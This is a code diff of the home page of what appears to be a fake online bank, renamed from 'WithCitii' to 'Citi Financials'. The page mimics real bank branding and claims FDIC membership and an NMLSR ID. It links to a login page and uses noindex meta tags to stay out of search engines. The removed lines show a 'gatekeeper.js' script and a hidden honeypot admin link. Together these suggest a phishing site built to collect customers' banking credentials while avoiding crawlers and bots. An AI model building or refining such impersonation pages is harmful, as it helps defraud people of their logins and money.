@@ -2,73 +2,83 @@
 <html lang="en">
 
 <head>
-  <link rel="stylesheet" href="input.css">
-  <link rel="stylesheet" href="style.css">
-  <script src="gatekeeper.js"></script>
-  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex, notranslate, noodp">
-  <meta name="googlebot" content="noindex, nofollow">
-  <meta name="google" content="notranslate">
-  <meta name="referrer" content="same-origin">
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WithCitii – Personal & Business Banking – Student, Auto & Home Loans</title>
-  
-  
+  <title>Citi Financials – Personal & Business Banking – Student, Auto & Home Loans</title>
+  <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            primary: "#056dae",
+            secondary: "#004B8D",
+            accent: "#FCCC44",
+            bankGray: "#F4F4F4",
+            bankText: "#333333"
+          },
+          fontFamily: {
+            sans: ["Inter", "sans-serif"],
+
+          }
+        }
+      }
+    };
+  </script>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap"
     rel="stylesheet" />
   <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&display=swap"
     rel="stylesheet" />
-  
+  <style type="text/tailwindcss">
+    @layer base {
+      body { @apply bg-white text-bankText font-sans antialiased; }
+    }
+    @layer components {
+      .nav-link { @apply text-sm font-semibold hover:underline; }
+      .btn-wf-primary { @apply bg-primary text-white px-6 py-2 rounded-sm font-bold hover:bg-blue-900 transition-colors shadow-sm; }
+      .service-card { @apply flex flex-col items-center text-center p-6 border-transparent border-2 hover:border-primary/20 hover:bg-bankGray/50 rounded-lg transition-all; }
+    }
+  </style>
   <link rel="icon" type="image/png" href="logo.png">
 
-  
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
   <meta name="googlebot" content="noindex, nofollow">
 
   <!-- Social Meta Tags -->
-  <meta property="og:title" content="WithCitii">
+  <meta property="og:title" content="Citi Financials Online">
   <meta property="og:description"
-    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with WithCitii.">
+    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with Citi Financials.">
   <meta property="og:image"
-    content="https://raw.githubusercontent.com/madebyframeio/withcitti-Project/main/meta.png">
+    content="https://raw.githubusercontent.com/madebyframeio/Citi Financials-Project/main/meta.png">
   <meta property="og:url" content="https://citi-financials.netlify.app/">
   <meta property="og:type" content="website">
 
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="WithCitii">
+  <meta name="twitter:title" content="Citi Financials Online">
   <meta name="twitter:description"
-    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with WithCitii.">
+    content="Secure, simplified, and powerful online banking. Access your dashboard, track your transactions, and manage your assets with Citi Financials.">
   <meta name="twitter:image"
-    content="https://raw.githubusercontent.com/madebyframeio/withcitti-Project/main/meta.png">
-
-  <link rel="manifest" href="manifest.json">
-  <meta name="theme-color" content="#056dae">
-  <meta name="apple-mobile-web-app-capable" content="yes">
-  <meta name="apple-mobile-web-app-status-bar-style" content="#056dae">
-  <meta name="apple-mobile-web-app-title" content="WithCitii">
-
+    content="https://raw.githubusercontent.com/madebyframeio/Citi Financials-Project/main/meta.png">
 </head>
 
-<body class="">
-  <!-- Honeypot Link (Hidden from users, only for bots) -->
-  <a href="/admin-console-secure-access-point" style="display:none; visibility:hidden;" aria-hidden="true" tabindex="-1">Admin Access</a>
-  
+<body class=" overflow-x-hidden">
   <!-- Top Utility Bar -->
   <div class="bg-bankGray border-b border-gray-200">
     <div class="max-w-7xl mx-auto px-4 py-2 flex justify-end gap-6 text-[11px] font-semibold text-secondary">
       <a href="#" class="hover:underline">AdChoices</a>
-      <a href="#" class="hover:underline">About WithCitii</a>
+      <a href="#" class="hover:underline">About Citi Financials</a>
       <a href="#" class="hover:underline">Careers</a>
       <a href="faq.html" class="hover:underline">Privacy, Cookies, Security & Legal</a>
     </div>
   </div>
 
   <!-- Main Header -->
-  <header class="glass-panel text-white sticky top-0 " style="background-color: white !important; opacity: 1 !important; z-index: 100 !important; z-50">
-    <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between bg-primary md:bg-transparent">
+  <header class="bg-primary text-white shadow-md sticky top-0 z-50">
+    <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
       <div class="flex items-center gap-8">
         <!-- Logo -->
         <div class="bg-white p-1 rounded-sm shadow-inner">
-          <img src="logo.png" alt="WithCitii" class="h-10">
+          <img src="logo.png" alt="Citi Financials" class="h-10">
         </div>
         <!-- Nav -->
         <nav class="hidden md:flex gap-6 uppercase text-[11px] tracking-wider font-bold">
@@ -114,7 +124,7 @@
         <p class="text-lg mb-8 max-w-md text-bankText/80 leading-relaxed">Our bankers are here to help you move
           your financial life forward with expert guidance and secure tools.</p>
         <div class="flex gap-4">
-          <a href="login.html" class="btn-wf-primary hover-lift">Sign On</a>
+          <a href="login.html" class="btn-wf-primary">Sign On</a>
           <button class="text-secondary font-bold hover:underline">Find a Location</button>
         </div>
       </div>
@@ -131,7 +141,7 @@
   <section class="max-w-7xl mx-auto px-4 py-24">
     <h2 class="font-sans text-3xl mb-16 text-center text-primary font-bold">Discover how we can help</h2>
     <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-12">
-      <div class="service-card hover-lift group bg-white border border-borderGray p-8 rounded-sm text-center flex flex-col items-center">
+      <div class="service-card group">
         <span
           class="material-symbols-outlined text-4xl text-primary mb-4 group-hover:scale-110 transition-transform">account_balance</span>
         <h3 class="font-bold mb-2">Everyday Banking</h3>
@@ -141,7 +151,7 @@
           Explore Checking <span class="material-symbols-outlined text-xs">arrow_forward</span>
         </a>
       </div>
-      <div class="service-card hover-lift group bg-white border border-borderGray p-8 rounded-sm text-center flex flex-col items-center">
+      <div class="service-card group">
         <span
           class="material-symbols-outlined text-4xl text-primary mb-4 group-hover:scale-110 transition-transform">credit_card</span>
         <h3 class="font-bold mb-2">Credit Cards</h3>
@@ -151,7 +161,7 @@
           Compare Cards <span class="material-symbols-outlined text-xs">arrow_forward</span>
         </a>
       </div>
-      <div class="service-card hover-lift group bg-white border border-borderGray p-8 rounded-sm text-center flex flex-col items-center">
+      <div class="service-card group">
         <span
           class="material-symbols-outlined text-4xl text-primary mb-4 group-hover:scale-110 transition-transform">home</span>
         <h3 class="font-bold mb-2">Home Loans</h3>
@@ -161,7 +171,7 @@
           View Rates <span class="material-symbols-outlined text-xs">arrow_forward</span>
         </a>
       </div>
-      <div class="service-card hover-lift group bg-white border border-borderGray p-8 rounded-sm text-center flex flex-col items-center">
+      <div class="service-card group">
         <span
           class="material-symbols-outlined text-4xl text-primary mb-4 group-hover:scale-110 transition-transform">trending_up</span>
         <h3 class="font-bold mb-2">Investing</h3>
@@ -180,7 +190,7 @@
       <div
         class="grid grid-cols-2 md:grid-cols-4 gap-12 mb-16 text-[11px] text-secondary font-bold uppercase tracking-wider">
         <div class="flex flex-col gap-4">
-          <a href="#" class="hover:underline">About WithCitii</a>
+          <a href="#" class="hover:underline">About Citi Financials</a>
           <a href="#" class="hover:underline">Careers</a>
           <a href="#" class="hover:underline">Social Impact</a>
         </div>
@@ -205,8 +215,8 @@
       <div class="border-t border-gray-300 pt-10 text-[10px] text-gray-500 leading-relaxed max-w-4xl">
         <p class="mb-4">1. Investment and Insurance Products are: NOT A DEPOSIT • NOT FDIC INSURED • NOT INSURED
           BY ANY FEDERAL GOVERNMENT AGENCY • NOT GUARANTEED BY THE BANK • MAY LOOSE VALUE.</p>
-        <p class="mb-4">WithCitii Bank, N.A. Member FDIC.</p>
-        <p>&copy; <span id="current-year">2026</span> WithCitii. All rights reserved. NMLSR ID 399801</p>
+        <p class="mb-4">Citi Financials Bank, N.A. Member FDIC.</p>
+        <p>&copy; <span id="current-year">2026</span> Citi Financials. All rights reserved. NMLSR ID 399801</p>
       </div>
     </div>
   </footer>
